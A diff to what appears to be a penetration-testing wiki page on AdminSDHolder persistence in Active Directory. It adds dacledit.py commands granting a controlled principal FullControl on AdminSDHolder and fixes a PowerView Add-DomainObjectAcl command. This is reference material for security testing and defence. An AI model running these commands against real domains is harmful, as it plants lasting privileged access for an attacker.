@@ -37,17 +37,29 @@ At the next run of SDProp, `attackercontrolleduser` will have a `GenericAll` pri
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, this can be done with&#x20;
+From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).
+
+:warning: _At the time of writing, May 2nd 2022, the_ [_Pull Request (#1291)_](https://github.com/SecureAuthCorp/impacket/pull/1291) _is still pending._
+
+```bash
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+```
+
+AdminSdHolder's DACL can then be inspected with the same utility.
+
+```bash
+dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+```
 {% endtab %}
 
 {% tab title="Windows" %}
 This can be done in PowerShell with `Add-DomainObjectAcl` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module.
 
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,CN=DOMAIN,CN=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
 ```
 
-AdminSdHolder's DACL can be inspected with `Get-DomainObjectAcl` as well.
+AdminSdHolder's DACL can then be inspected with `Get-DomainObjectAcl`.
 
 ```powershell
 # Inspect all AdminSdHolder's DACL
